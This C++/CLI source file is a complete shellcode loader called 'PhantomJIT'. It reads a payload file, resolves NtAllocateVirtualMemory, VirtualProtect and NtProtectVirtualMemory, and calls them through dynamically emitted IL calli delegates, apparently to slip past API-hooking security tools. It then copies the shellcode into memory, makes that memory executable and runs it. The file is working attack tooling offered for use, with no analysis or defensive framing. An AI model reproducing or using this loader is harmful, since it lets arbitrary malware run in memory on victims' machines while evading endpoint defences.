#include <windows.h>
#include <string.h>
#using <mscorlib.dll>
#using <System.dll>
using namespace System;
using namespace System::IO;
using namespace System::Reflection;
using namespace System::Reflection::Emit;
using namespace System::Runtime::InteropServices;
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);
typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);
typedef LPVOID (WINAPI *VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
typedef BOOL (WINAPI *VirtualProtect_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);
#define PAGE_EXECUTE_READWRITE 0x40
#define PAGE_READWRITE 0x04
#define PAGE_EXECUTE_READ 0x20
public delegate Int32 NtAllocateDelegate(IntPtr process, IntPtr addressPtr, IntPtr zeroBits, IntPtr sizePtr, Int32 allocationType, Int32 protect);
public delegate Int32 VirtualProtectDelegate(IntPtr address, IntPtr size, Int32 newProtect, IntPtr oldProtectPtr);
public delegate Int32 NtProtectDelegate(IntPtr process, IntPtr addressPtr, IntPtr sizePtr, Int32 newProtect, IntPtr oldProtectPtr);
ref class MemoryProtectionJIT
{
private:
    static NtAllocateVirtualMemory_t ntAllocatePtr = nullptr;
    static VirtualProtect_t virtualProtectPtr = nullptr;
    static NtProtectVirtualMemory_t ntProtectPtr = nullptr;
public:
    static bool Initialize()
    {
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hKernel32 || !hNtdll) {
            Console::WriteLine("[JIT] Failed to get module handles");
            return false;
        }
        ntAllocatePtr = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        virtualProtectPtr = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
        ntProtectPtr = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        if (!ntAllocatePtr || !virtualProtectPtr || !ntProtectPtr) {
            Console::WriteLine("[JIT] Failed to resolve protection functions");
            return false;
        }
        Console::WriteLine("[JIT] NtAllocateVirtualMemory at: 0x{0:X}", (UInt64)ntAllocatePtr);
        Console::WriteLine("[JIT] VirtualProtect at: 0x{0:X}", (UInt64)virtualProtectPtr);
        Console::WriteLine("[JIT] NtProtectVirtualMemory at: 0x{0:X}", (UInt64)ntProtectPtr);
        return true;
    }
    static NtAllocateDelegate^ CreateNtAllocateDelegate()
    {
        if (!ntAllocatePtr) {
            throw gcnew InvalidOperationException("NtAllocateVirtualMemory not initialized");
        }
        Module^ coreMod = Object::typeid->Module;
        DynamicMethod^ dm = gcnew DynamicMethod(
            "JIT_NtAllocateVirtualMemory",
            Int32::typeid,  
            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, Int32::typeid, Int32::typeid },
            coreMod,
            true
        );
        ILGenerator^ il = dm->GetILGenerator();
        il->Emit(OpCodes::Ldarg_0);  
        il->Emit(OpCodes::Ldarg_1);  
        il->Emit(OpCodes::Ldarg_2);  
        il->Emit(OpCodes::Ldarg_3);  
        il->Emit(OpCodes::Ldarg, 4); 
        il->Emit(OpCodes::Ldarg, 5); 
        il->Emit(OpCodes::Ldc_I8, (Int64)(void*)ntAllocatePtr);
        il->Emit(OpCodes::Conv_I);
        il->EmitCalli(
            OpCodes::Calli,
            CallingConvention::StdCall,
            Int32::typeid,
            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, Int32::typeid, Int32::typeid }
        );
        il->Emit(OpCodes::Ret);
        return safe_cast<NtAllocateDelegate^>(dm->CreateDelegate(NtAllocateDelegate::typeid));
    }
    static VirtualProtectDelegate^ CreateVirtualProtectDelegate()
    {
        if (!virtualProtectPtr) {
            throw gcnew InvalidOperationException("VirtualProtect not initialized");
        }
        Module^ coreMod = Object::typeid->Module;
        DynamicMethod^ dm = gcnew DynamicMethod(
            "JIT_VirtualProtect",
            Int32::typeid,  
            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, Int32::typeid, IntPtr::typeid },
            coreMod,
            true
        );
        ILGenerator^ il = dm->GetILGenerator();
        il->Emit(OpCodes::Ldarg_0);  
        il->Emit(OpCodes::Ldarg_1);  
        il->Emit(OpCodes::Ldarg_2);  
        il->Emit(OpCodes::Ldarg_3);  
        il->Emit(OpCodes::Ldc_I8, (Int64)(void*)virtualProtectPtr);
        il->Emit(OpCodes::Conv_I);
        il->EmitCalli(
            OpCodes::Calli,
            CallingConvention::StdCall,
            Int32::typeid,
            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, Int32::typeid, IntPtr::typeid }
        );
        il->Emit(OpCodes::Ret);
        return safe_cast<VirtualProtectDelegate^>(dm->CreateDelegate(VirtualProtectDelegate::typeid));
    }
    static NtProtectDelegate^ CreateNtProtectDelegate()
    {
        if (!ntProtectPtr) {
            throw gcnew InvalidOperationException("NtProtectVirtualMemory not initialized");
        }
        Module^ coreMod = Object::typeid->Module;
        DynamicMethod^ dm = gcnew DynamicMethod(
            "JIT_NtProtectVirtualMemory", 
            Int32::typeid,
            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, Int32::typeid, IntPtr::typeid },
            coreMod,
            true
        );
        ILGenerator^ il = dm->GetILGenerator();
        il->Emit(OpCodes::Ldarg_0);  
        il->Emit(OpCodes::Ldarg_1);  
        il->Emit(OpCodes::Ldarg_2);  
        il->Emit(OpCodes::Ldarg_3);  
        il->Emit(OpCodes::Ldarg, 4); 
        il->Emit(OpCodes::Ldc_I8, (Int64)(void*)ntProtectPtr);
        il->Emit(OpCodes::Conv_I);
        il->EmitCalli(
            OpCodes::Calli,
            CallingConvention::StdCall,
            Int32::typeid,
            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, Int32::typeid, IntPtr::typeid }
        );
        il->Emit(OpCodes::Ret);
        return safe_cast<NtProtectDelegate^>(dm->CreateDelegate(NtProtectDelegate::typeid));
    }
};
int main(array<String^>^ args)
{
    if (args->Length != 1) {
        Console::WriteLine("Usage: {0} <shellcode.bin>", 
            AppDomain::CurrentDomain->FriendlyName);
        return 1;
    }
    if (!MemoryProtectionJIT::Initialize()) {
        Console::WriteLine("[PhantomJIT] Failed to initialize JIT protection");
        return 1;
    }
    array<Byte>^ shellcode;
    try {
        shellcode = File::ReadAllBytes(args[0]);
        Console::WriteLine("[PhantomJIT] Loaded {0} bytes of shellcode", shellcode->Length);
    }
    catch (Exception^ ex) {
        Console::WriteLine("[PhantomJIT] Error reading shellcode: {0}", ex->Message);
        return 1;
    }
    try {
        Console::WriteLine("[PhantomJIT] Creating JIT allocation delegate...");
        NtAllocateDelegate^ jitNtAllocate = MemoryProtectionJIT::CreateNtAllocateDelegate();
        Console::WriteLine("[PhantomJIT] Using JIT NtAllocateVirtualMemory to allocate RW memory...");
        void* baseAddress = nullptr;
        SIZE_T regionSize = shellcode->Length;
        Int32 ntResult = jitNtAllocate(
            IntPtr(GetCurrentProcess()),
            IntPtr(&baseAddress),
            IntPtr::Zero,  
            IntPtr(&regionSize),
            (Int32)(MEM_COMMIT | MEM_RESERVE),
            (Int32)PAGE_READWRITE
        );
        if (ntResult < 0) {
            Console::WriteLine("[PhantomJIT] JIT NtAllocateVirtualMemory failed: 0x{0:X}", ntResult);
            return 1;
        }
        Console::WriteLine("[PhantomJIT] JIT NtAllocateVirtualMemory succeeded at: 0x{0:X}", (UInt64)baseAddress);
        pin_ptr<Byte> pShellcode = &shellcode[0];
        memcpy(baseAddress, pShellcode, shellcode->Length);
        Console::WriteLine("[PhantomJIT] Shellcode copied to memory");
        Console::WriteLine("[PhantomJIT] Creating JIT protection delegates...");
        VirtualProtectDelegate^ jitVirtualProtect = MemoryProtectionJIT::CreateVirtualProtectDelegate();
        Console::WriteLine("[PhantomJIT] Using JIT VirtualProtect to make memory RX...");
        DWORD oldProtect = 0;
        SIZE_T memorySize = shellcode->Length;
        Int32 result = jitVirtualProtect(
            IntPtr(baseAddress),
            IntPtr((void*)memorySize),
            (Int32)PAGE_EXECUTE_READ,
            IntPtr((void*)&oldProtect)
        );
        if (result == 0) {
            Console::WriteLine("[PhantomJIT] JIT VirtualProtect failed");
            return 1;
        }
        Console::WriteLine("[PhantomJIT] JIT VirtualProtect succeeded, old protect: 0x{0:X}", oldProtect);
        Console::WriteLine("[PhantomJIT] Using JIT NtProtect to make memory RWX...");
        NtProtectDelegate^ jitNtProtect = MemoryProtectionJIT::CreateNtProtectDelegate();
        void* basePtrForProtect = baseAddress;
        SIZE_T sizeVar = shellcode->Length;
        DWORD oldProtectNt = 0;
        Int32 ntProtectResult = jitNtProtect(
            IntPtr(GetCurrentProcess()),
            IntPtr(&basePtrForProtect),
            IntPtr(&sizeVar),
            (Int32)PAGE_EXECUTE_READWRITE,
            IntPtr(&oldProtectNt)
        );
        if (ntProtectResult < 0) {
            Console::WriteLine("[PhantomJIT] JIT NtProtect failed: 0x{0:X}", ntProtectResult);
        } else {
            Console::WriteLine("[PhantomJIT] JIT NtProtect succeeded, old protect: 0x{0:X}", oldProtectNt);
        }
        Module^ coreMod = Object::typeid->Module;
        DynamicMethod^ dm = gcnew DynamicMethod(
            "PhantomJIT_Execute",
            Void::typeid,
            Type::EmptyTypes,
            coreMod,
            true
        );
        ILGenerator^ il = dm->GetILGenerator();
        il->Emit(OpCodes::Ldc_I8, (Int64)baseAddress);
        il->Emit(OpCodes::Conv_I);
        il->EmitCalli(
            OpCodes::Calli,
            CallingConvention::StdCall,
            Void::typeid,
            Type::EmptyTypes
        );
        il->Emit(OpCodes::Ret);
        auto action = safe_cast<Action^>(dm->CreateDelegate(Action::typeid));
        Console::WriteLine("[PhantomJIT] Executing shellcode...");
        action();
        Console::WriteLine("[PhantomJIT] Execution completed successfully");
    }
    catch (Exception^ ex) {
        Console::WriteLine("[PhantomJIT] Exception: {0}", ex->Message);
        if (ex->InnerException) {
            Console::WriteLine("[PhantomJIT] Inner exception: {0}", ex->InnerException->Message);
        }
        return 1;
    }
    return 0;
}